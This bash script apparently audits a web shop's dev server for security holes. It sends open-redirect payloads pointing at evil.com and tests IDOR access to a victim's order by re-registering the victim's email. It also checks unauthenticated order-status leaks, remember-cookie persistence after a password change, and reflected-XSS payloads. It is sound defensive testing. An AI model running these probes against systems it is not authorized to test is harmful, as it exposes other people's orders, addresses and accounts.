#!/bin/bash
B=https://dev.udshafts.com
tok(){ curl -s -b $1 -c $1 "$B$2" | grep -o 'name="_token" value="[^"]*"' | head -1 | sed 's/.*value="//;s/"//'; }
reg(){ rm -f $1; curl -s -c $1 -o /dev/null $B/register; T=$(tok $1 /register); curl -s -o /dev/null -w "register $2: %{http_code} %{redirect_url}\n" -b $1 -c $1 -X POST $B/register -d "_token=$T&name=$3&email=$2&password=${UDS_QA_PASSWORD}&password_confirmation=${UDS_QA_PASSWORD}"; }
echo "### 1. open-redirect probes (user B, fresh jar each)"
reg jarB b-audit@udshafts.local AuditB
for R in "//evil.com" "/\\evil.com" "https://evil.com" "/%5Cevil.com"; do
  rm -f jarR; curl -s -c jarR -o /dev/null "$B/login?redirect=$R"; T=$(tok jarR /login)
  curl -s -o /dev/null -w "redirect=$R -> %{http_code} %{redirect_url}\n" -b jarR -c jarR -X POST $B/login -d "_token=$T&email=b-audit@udshafts.local&password=${UDS_QA_PASSWORD}"
done
echo "### 2. IDOR: A (other email) views victim guest order"
curl -s -o /dev/null -w "A GET /account/orders/UDS-AUDIT1: %{http_code}\n" -b jarA $B/account/orders/UDS-AUDIT1
echo "### 2b. register C with victim's email (no verification) and view order / requests / buy-again"
reg jarC victim-audit@udshafts.local Attacker
curl -s -w "\nC GET /account/orders/UDS-AUDIT1: %{http_code}\n" -b jarC $B/account/orders/UDS-AUDIT1 | grep -o "Secret Lane\|813-555-0101\|AUDIT-SKU" | sort -u
curl -s -w "\nC /account/requests: %{http_code}\n" -b jarC $B/account/requests | grep -o "victim private lead message"
curl -s -o /dev/null -w "C /account/buy-again: %{http_code}\n" -b jarC $B/account/buy-again
curl -s -o /dev/null -w "C /account/orders list: %{http_code}\n" -b jarC $B/account/orders
echo "### 3. order status without login"
for Q in "" "?e=victim-audit@udshafts.local" "?e=VICTIM-AUDIT@udshafts.local" "?e=wrong@udshafts.local" "?email=victim-audit@udshafts.local"; do curl -s -o /dev/null -w "/orders/UDS-AUDIT1/status$Q -> %{http_code}\n" "$B/orders/UDS-AUDIT1/status$Q"; done
curl -s "$B/orders/UDS-AUDIT1/status?e=victim-audit@udshafts.local" | grep -o "Secret Lane\|813-555-0101\|AUDITTOKEN\|/pay/" | sort -u
curl -s -o /dev/null -w "logged-in C, no e: %{http_code}\n" -b jarC "$B/orders/UDS-AUDIT1/status"
echo "### 3b. /track-order"
rm -f jarT; curl -s -c jarT -o /dev/null $B/track-order; T=$(tok jarT /track-order)
curl -s -o /dev/null -w "track good: %{http_code} %{redirect_url}\n" -b jarT -c jarT -X POST $B/track-order -d "_token=$T&orderid=18&order_email=victim-audit@udshafts.local"
curl -s -o /dev/null -w "track bad: %{http_code} %{redirect_url}\n" -b jarT -c jarT -X POST $B/track-order -d "_token=$T&orderid=UDS-AUDIT1&order_email=x@udshafts.local"
echo "### 4. dropship IDOR"
T=$(tok jarA /account/dropship)
curl -s -o /dev/null -w "A add dropship: %{http_code}\n" -b jarA -c jarA -X POST $B/account/dropship -d "_token=$T&company=AuditCo&street=1%20Main&city=Tampa&state=FL&postcode=33601&country=us"
echo "### 5. password change checks (A)"
T=$(tok jarA /account/settings)
curl -s -o /dev/null -b jarA -c jarA -X POST $B/account/password -d "_token=$T&password=${UDS_QA_PASSWORD}&password_confirmation=${UDS_QA_PASSWORD}"; curl -s -b jarA $B/account/settings | grep -o "Current password is incorrect\|Password updated" | head -1
curl -s -o /dev/null -b jarA -c jarA -X POST $B/account/password -d "_token=$T&current_password=${UDS_QA_PASSWORD}&password=${UDS_QA_PASSWORD}&password_confirmation=${UDS_QA_PASSWORD}"; curl -s -b jarA $B/account/settings | grep -o "Current password is incorrect\|Password updated" | head -1
echo "### 5b. remember cookie still valid after password change? (drop session cookie, keep remember_*)"
grep -v "laravel-session\|XSRF" jarA > jarA_rem; grep -c remember jarA_rem
curl -s -o /dev/null -w "GET /account with remember cookie only: %{http_code} %{redirect_url}\n" -b jarA_rem $B/account
echo "### 6. XSS: name <b>x</b> in dashboard escaped?"
curl -s -b jarA $B/account | grep -o "&lt;b&gt;x&lt;/b&gt;\|<b>x</b>" | head -1
echo "### 7. Google garbage credential"
rm -f jarG; curl -s -c jarG -o /dev/null $B/login; T=$(tok jarG /login)
curl -s -o /dev/null -w "POST /auth/google junk: %{http_code} %{redirect_url}\n" -b jarG -c jarG -X POST $B/auth/google -d "_token=$T&credential=junk.junk.junk"
echo "### 8. reset page reflection"
curl -s "$B/reset-password/abc?email=%3Cscript%3Ealert(1)%3C/script%3E" | grep -o "&lt;script&gt;\|<script>alert" | head -1
